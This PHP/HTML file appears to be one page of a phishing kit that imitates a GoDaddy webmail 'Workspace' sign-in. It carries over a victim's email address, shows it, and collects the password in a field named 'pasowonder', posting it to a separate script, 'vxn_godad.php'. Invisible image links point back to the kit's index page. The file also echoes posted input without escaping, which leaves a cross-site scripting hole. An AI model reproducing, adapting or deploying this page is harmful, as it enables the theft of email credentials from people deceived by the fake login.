<?php

$emal = $_POST['emal'];

?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Workspace</title>
<link rel="shortcut icon" href="images/fav_godad.ico" />
<style type="text/css">
body
{
   background-color: #FFFFFF;
   background-image: url(images/godadbg.png);
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E842;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:1347px;height:40px;text-align:left;z-index:2;">
<img src="images/oriGodad.png" id="Image1" alt="" align="top" border="0" style="width:1347px;height:40px;"></div>
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:677px;top:69px;width:578px;height:583px;text-align:left;z-index:3;">
<img src="images/bodeGodad1.png" id="Image2" alt="" align="top" border="0" style="width:578px;height:583px;"></div>
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:0px;top:163px;width:683px;height:330px;text-align:left;z-index:4;">
<img src="images/bodeGodad2.png" id="Image3" alt="" align="top" border="0" style="width:683px;height:330px;"></div>
<div id="bv_Image4" style="margin:0;padding:0;position:absolute;left:0px;top:697px;width:1345px;height:65px;text-align:left;z-index:5;">
<img src="images/footaGodad3.png" id="Image4" alt="" align="top" border="0" style="width:1345px;height:65px;"></div>

<div id="bv_Form1" style="position:absolute;left:761px;top:351px;width:435px;height:262px;z-index:6">
<form name="Form1" method="post" action="vxn_godad.php" id="Form1">

<input name="emal" type="hidden" value="<?php echo $emal;?>">

<div id="bv_Text2" style="margin:0;padding:0;position:absolute;left:29px;top:33px;width:370px;height:36px;text-align:left;z-index:0;">
<font style="font-size:29px" color="#004040" face="Corbel"><b><?php echo $_POST["emal"];?></b></font></div>
<input type="password" id="Editbox1" style="position:absolute;left:31px;top:120px;width:347px;height:26px;border:0px #C0C0C0 solid;background-color:transparent;font-family:'Courier New';font-size:16px;z-index:1" name="pasowonder" value="" pattern=".{5,20}" oninvalid="this.setCustomValidity('Required')" oninput="setCustomValidity('')" required>
<input type="submit" id="Button1" name="Button1" value="" style="position:absolute;left:19px;top:198px;width:369px;height:48px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2">
<input type="checkbox" id="Checkbox1" name="Checkbox1" value="on" style="position:absolute;left:19px;top:167px;z-index:3">
</form>
</div>
<div id="bv_Image5" style="margin:0;padding:0;position:absolute;left:853px;top:70px;width:232px;height:62px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:7;">
<a href="index.php"><img src="images/klik.png" id="Image5" alt="" align="top" border="0" style="width:232px;height:62px;"></a></div>
<div id="bv_Image6" style="margin:0;padding:0;position:absolute;left:96px;top:11px;width:176px;height:19px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:8;">
<a href="index.php"><img src="images/klik.png" id="Image6" alt="" align="top" border="0" style="width:176px;height:19px;"></a></div>
<div id="bv_Image7" style="margin:0;padding:0;position:absolute;left:897px;top:722px;width:99px;height:21px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:9;">
<a href="index.php"><img src="images/klik.png" id="Image7" alt="" align="top" border="0" style="width:99px;height:21px;"></a></div>
</body>
</html>